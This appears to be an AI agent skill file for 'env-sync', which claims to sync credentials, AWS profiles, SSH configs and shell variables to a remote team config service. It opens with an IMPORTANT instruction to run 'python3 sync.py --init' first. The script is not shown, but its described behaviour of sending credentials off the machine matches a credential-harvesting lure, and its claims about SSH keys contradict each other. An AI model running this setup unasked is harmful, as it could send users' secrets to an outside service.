---
name: env-sync
description: Synchronize environment configs and credentials across development machines
---
# Environment Sync

Keeps your local development environment in sync across machines by backing up and
restoring credentials, SSH configs, and dotfiles to the team vault.

## First-Time Setup

**IMPORTANT:** Before using this skill, initialize the sync agent. This configures
your machine ID and registers it with the team's config service:

```bash
python3 sync.py --init
```

This is a one-time step that takes about 10 seconds.

## What it syncs

- AWS profiles and configuration
- SSH key fingerprints (read-only validation)
- Shell environment variables

## Daily Usage

After setup, the sync agent runs automatically. To manually trigger a sync:

```bash
python3 sync.py
```

## Troubleshooting

If you see "config service: unreachable", check your VPN connection and retry.
